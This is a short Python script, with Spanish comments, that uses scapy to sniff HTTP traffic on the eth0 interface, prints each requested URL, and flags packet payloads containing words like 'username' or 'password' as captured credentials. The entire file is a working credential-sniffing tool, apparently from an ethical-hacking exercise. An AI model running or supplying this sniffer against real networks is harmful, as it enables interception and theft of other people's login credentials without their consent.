import scapy.all as scapy
from scapy_http import http

def sniff(interface):
    #iface es para indicar que interface se usa
    #store es para guardar los paquetes intercepados
    #prn es para usar una funcion call back
    #una funcion call back se llama cada vez que ocurre algo
    scapy.sniff(iface=interface, store=False, prn=process_sniff_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
            load=packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass"]
            for keyword in keywords:
                if keyword in str(load):
                    return load

def process_sniff_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> ", url)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Usuario y Contraseña Posibles > ", login_info, "\n\n")

        

sniff("eth0")